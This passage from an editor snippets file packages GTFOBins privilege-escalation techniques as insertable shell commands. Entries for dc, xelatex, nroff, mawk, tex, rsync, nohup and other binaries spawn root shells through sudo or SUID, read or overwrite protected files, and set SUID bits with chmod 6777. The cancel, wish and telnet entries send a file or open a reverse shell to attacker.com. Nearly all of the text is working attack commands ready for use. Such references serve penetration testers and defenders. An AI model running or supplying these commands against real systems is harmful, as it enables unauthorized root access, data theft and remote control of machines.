            "sudo ab -p \\$LFILE \\$URL${0}",
            "```"
        ],
        "description": "abuse ab with sudo - Upload local file via HTTP POST request."
    },
    "dc shell (gtfobins)": {
        "prefix": "dc shell",
        "body": [
            "abuse dc with shell",
            "",
            "```sh",
            "dc -e '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse dc with shell"
    },
    "dc sudo (gtfobins)": {
        "prefix": "dc sudo",
        "body": [
            "abuse dc with sudo",
            "",
            "```sh",
            "sudo dc -e '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse dc with sudo"
    },
    "dc limited-suid (gtfobins)": {
        "prefix": "dc limited-suid",
        "body": [
            "abuse dc with limited-suid",
            "",
            "```sh",
            "./dc -e '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse dc with limited-suid"
    },
    "systemd-resolve sudo (gtfobins)": {
        "prefix": "systemd-resolve sudo",
        "body": [
            "abuse systemd-resolve with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo systemd-resolve --status",
            "!sh${0}",
            "```"
        ],
        "description": "abuse systemd-resolve with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "hd file-read (gtfobins)": {
        "prefix": "hd file-read",
        "body": [
            "abuse hd with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "hd \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hd with file-read"
    },
    "hd suid (gtfobins)": {
        "prefix": "hd suid",
        "body": [
            "abuse hd with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./hd \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hd with suid"
    },
    "hd sudo (gtfobins)": {
        "prefix": "hd sudo",
        "body": [
            "abuse hd with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo hd \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hd with sudo"
    },
    "xelatex shell (gtfobins)": {
        "prefix": "xelatex shell",
        "body": [
            "abuse xelatex with shell",
            "",
            "```sh",
            "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse xelatex with shell"
    },
    "xelatex file-read (gtfobins)": {
        "prefix": "xelatex file-read",
        "body": [
            "abuse xelatex with file-read, The read file will be part of the output.",
            "",
            "```sh",
            "xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{${1:file_to_read}}\\end{document}'",
            "strings article.dvi${0}",
            "```"
        ],
        "description": "abuse xelatex with file-read - The read file will be part of the output."
    },
    "xelatex sudo (gtfobins)": {
        "prefix": "xelatex sudo",
        "body": [
            "abuse xelatex with sudo",
            "",
            "```sh",
            "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse xelatex with sudo"
    },
    "xelatex limited-suid (gtfobins)": {
        "prefix": "xelatex limited-suid",
        "body": [
            "abuse xelatex with limited-suid",
            "",
            "```sh",
            "./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse xelatex with limited-suid"
    },
    "nroff file-read (gtfobins)": {
        "prefix": "nroff file-read",
        "body": [
            "abuse nroff with file-read, The file is typeset and some warning messages may appear.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nroff \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nroff with file-read - The file is typeset and some warning messages may appear."
    },
    "nroff shell (gtfobins)": {
        "prefix": "nroff shell",
        "body": [
            "abuse nroff with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '#!/bin/sh' > \\$TF/groff",
            "echo '/bin/sh' >> \\$TF/groff",
            "chmod +x \\$TF/groff",
            "GROFF_BIN_PATH=\\$TF nroff${0}",
            "```"
        ],
        "description": "abuse nroff with shell"
    },
    "nroff sudo (gtfobins)": {
        "prefix": "nroff sudo",
        "body": [
            "abuse nroff with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '#!/bin/sh' > \\$TF/groff",
            "echo '/bin/sh' >> \\$TF/groff",
            "chmod +x \\$TF/groff",
            "sudo GROFF_BIN_PATH=\\$TF nroff${0}",
            "```"
        ],
        "description": "abuse nroff with sudo"
    },
    "pg shell (gtfobins)": {
        "prefix": "pg shell",
        "body": [
            "abuse pg with shell",
            "",
            "```sh",
            "pg /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse pg with shell"
    },
    "pg file-read (gtfobins)": {
        "prefix": "pg file-read",
        "body": [
            "abuse pg with file-read",
            "",
            "```sh",
            "pg ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse pg with file-read"
    },
    "pg sudo (gtfobins)": {
        "prefix": "pg sudo",
        "body": [
            "abuse pg with sudo",
            "",
            "```sh",
            "sudo pg /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse pg with sudo"
    },
    "pg suid (gtfobins)": {
        "prefix": "pg suid",
        "body": [
            "abuse pg with suid",
            "",
            "```sh",
            "./pg ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse pg with suid"
    },
    "msgmerge file-read (gtfobins)": {
        "prefix": "msgmerge file-read",
        "body": [
            "abuse msgmerge with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msgmerge -P \\$LFILE /dev/null${0}",
            "```"
        ],
        "description": "abuse msgmerge with file-read"
    },
    "msgmerge sudo (gtfobins)": {
        "prefix": "msgmerge sudo",
        "body": [
            "abuse msgmerge with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo msgmerge -P \\$LFILE /dev/null${0}",
            "```"
        ],
        "description": "abuse msgmerge with sudo"
    },
    "msgmerge suid (gtfobins)": {
        "prefix": "msgmerge suid",
        "body": [
            "abuse msgmerge with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./msgmerge -P \\$LFILE /dev/null${0}",
            "```"
        ],
        "description": "abuse msgmerge with suid"
    },
    "cabal shell (gtfobins)": {
        "prefix": "cabal shell",
        "body": [
            "abuse cabal with shell",
            "",
            "```sh",
            "cabal exec -- /bin/sh${0}",
            "```"
        ],
        "description": "abuse cabal with shell"
    },
    "cabal suid (gtfobins)": {
        "prefix": "cabal suid",
        "body": [
            "abuse cabal with suid",
            "",
            "```sh",
            "./cabal exec -- /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse cabal with suid"
    },
    "cabal sudo (gtfobins)": {
        "prefix": "cabal sudo",
        "body": [
            "abuse cabal with sudo",
            "",
            "```sh",
            "sudo cabal exec -- /bin/sh${0}",
            "```"
        ],
        "description": "abuse cabal with sudo"
    },
    "tdbtool shell (gtfobins)": {
        "prefix": "tdbtool shell",
        "body": [
            "abuse tdbtool with shell",
            "",
            "```sh",
            "tdbtool",
            "! /bin/sh${0}",
            "```"
        ],
        "description": "abuse tdbtool with shell"
    },
    "tdbtool sudo (gtfobins)": {
        "prefix": "tdbtool sudo",
        "body": [
            "abuse tdbtool with sudo",
            "",
            "```sh",
            "sudo tdbtool",
            "! /bin/sh${0}",
            "```"
        ],
        "description": "abuse tdbtool with sudo"
    },
    "tdbtool limited-suid (gtfobins)": {
        "prefix": "tdbtool limited-suid",
        "body": [
            "abuse tdbtool with limited-suid",
            "",
            "```sh",
            "./tdbtool",
            "! /bin/sh${0}",
            "```"
        ],
        "description": "abuse tdbtool with limited-suid"
    },
    "zsoelim file-read (gtfobins)": {
        "prefix": "zsoelim file-read",
        "body": [
            "abuse zsoelim with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "zsoelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse zsoelim with file-read"
    },
    "zsoelim suid (gtfobins)": {
        "prefix": "zsoelim suid",
        "body": [
            "abuse zsoelim with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./zsoelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse zsoelim with suid"
    },
    "zsoelim sudo (gtfobins)": {
        "prefix": "zsoelim sudo",
        "body": [
            "abuse zsoelim with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo zsoelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse zsoelim with sudo"
    },
    "cancel file-upload (gtfobins)": {
        "prefix": "cancel file-upload",
        "body": [
            "abuse cancel with file-upload, Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "cancel -u \"\\$(cat \\$LFILE)\" -h \\$RHOST:\\$RPORT${0}",
            "```"
        ],
        "description": "abuse cancel with file-upload - Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file."
    },
    "cowsay shell (gtfobins)": {
        "prefix": "cowsay shell",
        "body": [
            "abuse cowsay with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec \"/bin/sh\";' >\\$TF",
            "cowsay -f \\$TF x${0}",
            "```"
        ],
        "description": "abuse cowsay with shell"
    },
    "cowsay sudo (gtfobins)": {
        "prefix": "cowsay sudo",
        "body": [
            "abuse cowsay with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec \"/bin/sh\";' >\\$TF",
            "sudo cowsay -f \\$TF x${0}",
            "```"
        ],
        "description": "abuse cowsay with sudo"
    },
    "dialog file-read (gtfobins)": {
        "prefix": "dialog file-read",
        "body": [
            "abuse dialog with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "dialog --textbox \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse dialog with file-read"
    },
    "dialog suid (gtfobins)": {
        "prefix": "dialog suid",
        "body": [
            "abuse dialog with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./dialog --textbox \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse dialog with suid"
    },
    "dialog sudo (gtfobins)": {
        "prefix": "dialog sudo",
        "body": [
            "abuse dialog with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo dialog --textbox \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse dialog with sudo"
    },
    "uuencode file-read (gtfobins)": {
        "prefix": "uuencode file-read",
        "body": [
            "abuse uuencode with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uuencode with file-read"
    },
    "uuencode suid (gtfobins)": {
        "prefix": "uuencode suid",
        "body": [
            "abuse uuencode with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uuencode with suid"
    },
    "uuencode sudo (gtfobins)": {
        "prefix": "uuencode sudo",
        "body": [
            "abuse uuencode with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uuencode with sudo"
    },
    "comm file-read (gtfobins)": {
        "prefix": "comm file-read",
        "body": [
            "abuse comm with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "comm \\$LFILE /dev/null 2>/dev/null${0}",
            "```"
        ],
        "description": "abuse comm with file-read"
    },
    "comm suid (gtfobins)": {
        "prefix": "comm suid",
        "body": [
            "abuse comm with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "comm \\$LFILE /dev/null 2>/dev/null${0}",
            "```"
        ],
        "description": "abuse comm with suid"
    },
    "comm sudo (gtfobins)": {
        "prefix": "comm sudo",
        "body": [
            "abuse comm with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo comm \\$LFILE /dev/null 2>/dev/null${0}",
            "```"
        ],
        "description": "abuse comm with sudo"
    },
    "chmod suid (gtfobins)": {
        "prefix": "chmod suid",
        "body": [
            "abuse chmod with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "./chmod 6777 \\$LFILE${0}",
            "```"
        ],
        "description": "abuse chmod with suid"
    },
    "chmod sudo (gtfobins)": {
        "prefix": "chmod sudo",
        "body": [
            "abuse chmod with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "sudo chmod 6777 \\$LFILE${0}",
            "```"
        ],
        "description": "abuse chmod with sudo"
    },
    "ssh-agent shell (gtfobins)": {
        "prefix": "ssh-agent shell",
        "body": [
            "abuse ssh-agent with shell",
            "",
            "```sh",
            "ssh-agent /bin/sh${0}",
            "```"
        ],
        "description": "abuse ssh-agent with shell"
    },
    "ssh-agent suid (gtfobins)": {
        "prefix": "ssh-agent suid",
        "body": [
            "abuse ssh-agent with suid",
            "",
            "```sh",
            "./ssh-agent /bin/ -p${0}",
            "```"
        ],
        "description": "abuse ssh-agent with suid"
    },
    "ssh-agent sudo (gtfobins)": {
        "prefix": "ssh-agent sudo",
        "body": [
            "abuse ssh-agent with sudo",
            "",
            "```sh",
            "sudo ssh-agent /bin/${0}",
            "```"
        ],
        "description": "abuse ssh-agent with sudo"
    },
    "mawk shell (gtfobins)": {
        "prefix": "mawk shell",
        "body": [
            "abuse mawk with shell",
            "",
            "```sh",
            "mawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse mawk with shell"
    },
    "mawk file-write (gtfobins)": {
        "prefix": "mawk file-write",
        "body": [
            "abuse mawk with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "mawk -v LFILE=\\$LFILE 'BEGIN { print \"DATA\" > LFILE }'${0}",
            "```"
        ],
        "description": "abuse mawk with file-write"
    },
    "mawk file-read (gtfobins)": {
        "prefix": "mawk file-read",
        "body": [
            "abuse mawk with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "mawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mawk with file-read"
    },
    "mawk suid (gtfobins)": {
        "prefix": "mawk suid",
        "body": [
            "abuse mawk with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./mawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mawk with suid"
    },
    "mawk sudo (gtfobins)": {
        "prefix": "mawk sudo",
        "body": [
            "abuse mawk with sudo",
            "",
            "```sh",
            "sudo mawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse mawk with sudo"
    },
    "mawk limited-suid (gtfobins)": {
        "prefix": "mawk limited-suid",
        "body": [
            "abuse mawk with limited-suid",
            "",
            "```sh",
            "./mawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse mawk with limited-suid"
    },
    "rev file-read (gtfobins)": {
        "prefix": "rev file-read",
        "body": [
            "abuse rev with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "rev \\$LFILE | rev${0}",
            "```"
        ],
        "description": "abuse rev with file-read"
    },
    "rev suid (gtfobins)": {
        "prefix": "rev suid",
        "body": [
            "abuse rev with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./rev \\$LFILE | rev${0}",
            "```"
        ],
        "description": "abuse rev with suid"
    },
    "rev sudo (gtfobins)": {
        "prefix": "rev sudo",
        "body": [
            "abuse rev with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo rev \\$LFILE | rev${0}",
            "```"
        ],
        "description": "abuse rev with sudo"
    },
    "msfconsole shell (gtfobins)": {
        "prefix": "msfconsole shell",
        "body": [
            "abuse msfconsole with shell",
            "",
            "```sh",
            "sudo msfconsole",
            "msf6 > irb",
            ">> system(\"/bin/sh\")${0}",
            "```"
        ],
        "description": "abuse msfconsole with shell"
    },
    "msfconsole sudo (gtfobins)": {
        "prefix": "msfconsole sudo",
        "body": [
            "abuse msfconsole with sudo",
            "",
            "```sh",
            "sudo msfconsole",
            "msf6 > irb",
            ">> system(\"/bin/sh\")${0}",
            "```"
        ],
        "description": "abuse msfconsole with sudo"
    },
    "tex shell (gtfobins)": {
        "prefix": "tex shell",
        "body": [
            "abuse tex with shell",
            "",
            "```sh",
            "tex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse tex with shell"
    },
    "tex sudo (gtfobins)": {
        "prefix": "tex sudo",
        "body": [
            "abuse tex with sudo",
            "",
            "```sh",
            "sudo tex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse tex with sudo"
    },
    "tex limited-suid (gtfobins)": {
        "prefix": "tex limited-suid",
        "body": [
            "abuse tex with limited-suid",
            "",
            "```sh",
            "./tex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse tex with limited-suid"
    },
    "pwsh shell (gtfobins)": {
        "prefix": "pwsh shell",
        "body": [
            "abuse pwsh with shell",
            "",
            "```sh",
            "pwsh${0}",
            "```"
        ],
        "description": "abuse pwsh with shell"
    },
    "pwsh file-write (gtfobins)": {
        "prefix": "pwsh file-write",
        "body": [
            "abuse pwsh with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "pwsh -c '\"DATA\" | Out-File \\$env:LFILE'${0}",
            "```"
        ],
        "description": "abuse pwsh with file-write"
    },
    "pwsh sudo (gtfobins)": {
        "prefix": "pwsh sudo",
        "body": [
            "abuse pwsh with sudo",
            "",
            "```sh",
            "sudo pwsh${0}",
            "```"
        ],
        "description": "abuse pwsh with sudo"
    },
    "espeak file-read (gtfobins)": {
        "prefix": "espeak file-read",
        "body": [
            "abuse espeak with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "espeak -qXf \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse espeak with file-read"
    },
    "espeak suid (gtfobins)": {
        "prefix": "espeak suid",
        "body": [
            "abuse espeak with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./espeak -qXf \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse espeak with suid"
    },
    "espeak sudo (gtfobins)": {
        "prefix": "espeak sudo",
        "body": [
            "abuse espeak with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo espeak -qXf \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse espeak with sudo"
    },
    "wish shell (gtfobins)": {
        "prefix": "wish shell",
        "body": [
            "abuse wish with shell",
            "",
            "```sh",
            "wish",
            "exec /bin/sh <@stdin >@stdout 2>@stderr${0}",
            "```"
        ],
        "description": "abuse wish with shell"
    },
    "wish non-interactive-reverse-shell (gtfobins)": {
        "prefix": "wish non-interactive-reverse-shell",
        "body": [
            "abuse wish with non-interactive-reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "echo 'set s [socket \\$::env(RHOST) \\$::env(RPORT)];while 1 { puts -nonewline \\$s \"> \";flush \\$s;gets \\$s c;set e \"exec \\$c\";if {![catch {set r [eval \\$e]} err]} { puts \\$s \\$r }; flush \\$s; }; close \\$s;' | wish${0}",
            "```"
        ],
        "description": "abuse wish with non-interactive-reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "wish sudo (gtfobins)": {
        "prefix": "wish sudo",
        "body": [
            "abuse wish with sudo",
            "",
            "```sh",
            "sudo wish",
            "exec /bin/sh <@stdin >@stdout 2>@stderr${0}",
            "```"
        ],
        "description": "abuse wish with sudo"
    },
    "sg shell (gtfobins)": {
        "prefix": "sg shell",
        "body": [
            "abuse sg with shell, Commands can be run if the current user's group is specified, therefore no additional permissions are needed.",
            "",
            "```sh",
            "sg \\$(id -ng)${0}",
            "```"
        ],
        "description": "abuse sg with shell - Commands can be run if the current user's group is specified, therefore no additional permissions are needed."
    },
    "sg sudo (gtfobins)": {
        "prefix": "sg sudo",
        "body": [
            "abuse sg with sudo",
            "",
            "```sh",
            "sudo sg root${0}",
            "```"
        ],
        "description": "abuse sg with sudo"
    },
    "nohup shell (gtfobins)": {
        "prefix": "nohup shell",
        "body": [
            "abuse nohup with shell",
            "",
            "```sh",
            "nohup /bin/sh -c \"sh <\\$(tty) >\\$(tty) 2>\\$(tty)\"${0}",
            "```"
        ],
        "description": "abuse nohup with shell"
    },
    "nohup command (gtfobins)": {
        "prefix": "nohup command",
        "body": [
            "abuse nohup with command",
            "",
            "```sh",
            "COMMAND='/usr/bin/id'",
            "nohup \"\\$COMMAND\"",
            "cat nohup.out${0}",
            "```"
        ],
        "description": "abuse nohup with command"
    },
    "nohup suid (gtfobins)": {
        "prefix": "nohup suid",
        "body": [
            "abuse nohup with suid",
            "",
            "```sh",
            "./nohup /bin/sh -p -c \"sh -p <\\$(tty) >\\$(tty) 2>\\$(tty)\"${0}",
            "```"
        ],
        "description": "abuse nohup with suid"
    },
    "nohup sudo (gtfobins)": {
        "prefix": "nohup sudo",
        "body": [
            "abuse nohup with sudo",
            "",
            "```sh",
            "sudo nohup /bin/sh -c \"sh <\\$(tty) >\\$(tty) 2>\\$(tty)\"${0}",
            "```"
        ],
        "description": "abuse nohup with sudo"
    },
    "telnet shell (gtfobins)": {
        "prefix": "telnet shell",
        "body": [
            "abuse telnet with shell, BSD version only. Needs to be connected first.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "telnet \\$RHOST \\$RPORT",
            "^]",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse telnet with shell - BSD version only. Needs to be connected first."
    },
    "telnet reverse-shell (gtfobins)": {
        "prefix": "telnet reverse-shell",
        "body": [
            "abuse telnet with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "TF=\\$(mktemp -u)",
            "mkfifo \\$TF && telnet \\$RHOST \\$RPORT 0<\\$TF | /bin/sh 1>\\$TF${0}",
            "```"
        ],
        "description": "abuse telnet with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "telnet sudo (gtfobins)": {
        "prefix": "telnet sudo",
        "body": [
            "abuse telnet with sudo, BSD version only. Needs to be connected first.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "sudo telnet \\$RHOST \\$RPORT",
            "^]",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse telnet with sudo - BSD version only. Needs to be connected first."
    },
    "telnet limited-suid (gtfobins)": {
        "prefix": "telnet limited-suid",
        "body": [
            "abuse telnet with limited-suid, BSD version only. Needs to be connected first.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "./telnet \\$RHOST \\$RPORT",
            "^]",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse telnet with limited-suid - BSD version only. Needs to be connected first."
    },
    "bundle shell (gtfobins)": {
        "prefix": "bundle shell",
        "body": [
            "abuse bundle with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'system(\"/bin/sh\")' > \\$TF/Gemfile",
            "cd \\$TF",
            "bundle install${0}",
            "```"
        ],
        "description": "abuse bundle with shell"
    },
    "bundle sudo (gtfobins)": {
        "prefix": "bundle sudo",
        "body": [
            "abuse bundle with sudo, This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo bundle help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse bundle with sudo - This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
    },
    "od file-read (gtfobins)": {
        "prefix": "od file-read",
        "body": [
            "abuse od with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "od -An -c -w9999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse od with file-read"
    },
    "od suid (gtfobins)": {
        "prefix": "od suid",
        "body": [
            "abuse od with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./od -An -c -w9999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse od with suid"
    },
    "od sudo (gtfobins)": {
        "prefix": "od sudo",
        "body": [
            "abuse od with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo od -An -c -w9999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse od with sudo"
    },
    "time shell (gtfobins)": {
        "prefix": "time shell",
        "body": [
            "abuse time with shell",
            "",
            "```sh",
            "/usr/bin/time /bin/sh${0}",
            "```"
        ],
        "description": "abuse time with shell"
    },
    "time suid (gtfobins)": {
        "prefix": "time suid",
        "body": [
            "abuse time with suid",
            "",
            "```sh",
            "./time /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse time with suid"
    },
    "time sudo (gtfobins)": {
        "prefix": "time sudo",
        "body": [
            "abuse time with sudo",
            "",
            "```sh",
            "sudo /usr/bin/time /bin/sh${0}",
            "```"
        ],
        "description": "abuse time with sudo"
    },
    "bundler shell (gtfobins)": {
        "prefix": "bundler shell",
        "body": [
            "abuse bundler with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'system(\"/bin/sh\")' > \\$TF/Gemfile",
            "cd \\$TF",
            "bundler install${0}",
            "```"
        ],
        "description": "abuse bundler with shell"
    },
    "bundler sudo (gtfobins)": {
        "prefix": "bundler sudo",
        "body": [
            "abuse bundler with sudo, This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo bundler help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse bundler with sudo - This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
    },
    "scrot shell (gtfobins)": {
        "prefix": "scrot shell",
        "body": [
            "abuse scrot with shell",
            "",
            "```sh",
            "scrot -e /bin/sh${0}",
            "```"
        ],
        "description": "abuse scrot with shell"
    },
    "scrot limited-suid (gtfobins)": {
        "prefix": "scrot limited-suid",
        "body": [
            "abuse scrot with limited-suid",
            "",
            "```sh",
            "./scrot -e /bin/sh${0}",
            "```"
        ],
        "description": "abuse scrot with limited-suid"
    },
    "scrot sudo (gtfobins)": {
        "prefix": "scrot sudo",
        "body": [
            "abuse scrot with sudo",
            "",
            "```sh",
            "sudo scrot -e /bin/sh${0}",
            "```"
        ],
        "description": "abuse scrot with sudo"
    },
    "perf shell (gtfobins)": {
        "prefix": "perf shell",
        "body": [
            "abuse perf with shell",
            "",
            "```sh",
            "perf stat /bin/sh${0}",
            "```"
        ],
        "description": "abuse perf with shell"
    },
    "perf suid (gtfobins)": {
        "prefix": "perf suid",
        "body": [
            "abuse perf with suid",
            "",
            "```sh",
            "./perf stat /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse perf with suid"
    },
    "perf sudo (gtfobins)": {
        "prefix": "perf sudo",
        "body": [
            "abuse perf with sudo",
            "",
            "```sh",
            "sudo perf stat /bin/sh${0}",
            "```"
        ],
        "description": "abuse perf with sudo"
    },
    "rsync shell (gtfobins)": {
        "prefix": "rsync shell",
        "body": [
            "abuse rsync with shell",
            "",
            "```sh",
            "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null${0}",
            "```"
        ],
        "description": "abuse rsync with shell"
    },
    "rsync sudo (gtfobins)": {
        "prefix": "rsync sudo",
        "body": [
            "abuse rsync with sudo",
            "",
            "```sh",
            "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null${0}",
            "```"
        ],
        "description": "abuse rsync with sudo"
    },
    "rsync suid (gtfobins)": {
        "prefix": "rsync suid",
        "body": [
            "abuse rsync with suid",
            "",
            "```sh",
            "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null${0}",
            "```"
        ],
        "description": "abuse rsync with suid"
    },
    "dmidecode sudo (gtfobins)": {
        "prefix": "dmidecode sudo",
        "body": [
            "abuse dmidecode with sudo, \nIt can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.\n\nGenerate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.\n\n\n\n- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.\n\n\n\n- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.\n\n\n\n```\n\nmake dmiwrite\n\nTF=$(mktemp)\n\necho \"DATA\" > $TF\n\n./dmiwrite $TF x.dmi\n\n```\n",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "sudo dmidecode --no-sysfs -d x.dmi --dump-bin \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse dmidecode with sudo - \nIt can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.\n\nGenerate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.\n\n\n\n- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.\n\n\n\n- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.\n\n\n\n```\n\nmake dmiwrite\n\nTF=$(mktemp)\n\necho \"DATA\" > $TF\n\n./dmiwrite $TF x.dmi\n\n```\n"
    },
    "mail shell (gtfobins)": {
        "prefix": "mail shell",
        "body": [
            "abuse mail with shell, This creates a valid Mbox file which may be required by the binary.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo \"From nobody@localhost \\$(date)\" > \\$TF",
